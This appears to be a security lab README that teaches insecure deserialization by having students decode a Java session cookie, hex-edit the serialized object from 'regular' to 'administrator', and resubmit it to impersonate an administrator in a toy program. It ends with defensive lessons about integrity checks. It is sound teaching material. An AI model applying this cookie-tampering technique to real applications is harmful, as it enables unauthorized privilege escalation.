# Lab 2. Session cookie

Compile Session:
```
javac Session.java
```

"Log in" as Copernicus and use his cookie in a session:
```
java Session copernicus Poland
java Session <cookie>
```

"Log in" as Galileo and use his cookie in a session:
```
java Session galileo Italy
java Session <cookie>
```

Analyze Copernicus' cookie object:
```
echo <copernicus' cookie> | base64 -d | xxd -g 1
echo <copernicus' cookie> | base64 -d > cookie.ser
java -jar ../jdeserialize-1.2.jar cookie.ser
```

Open the cookie (serialized object) in a hex editor:
```
ghex cookie.ser
```

Replace the contents as follows:
```
regular -> administrator
07 -> 0D
```

Convert the cookie object to Base64 and "submit" to impersonate as administrator:
```
base64 -w 0 cookie.ser
java Session <new cookie>
```

## Conclusion
1. Serialized objects can be tampered with.
2. Do not trust data from untrusted sources.
3. Use integrity checks to verify serialized data.
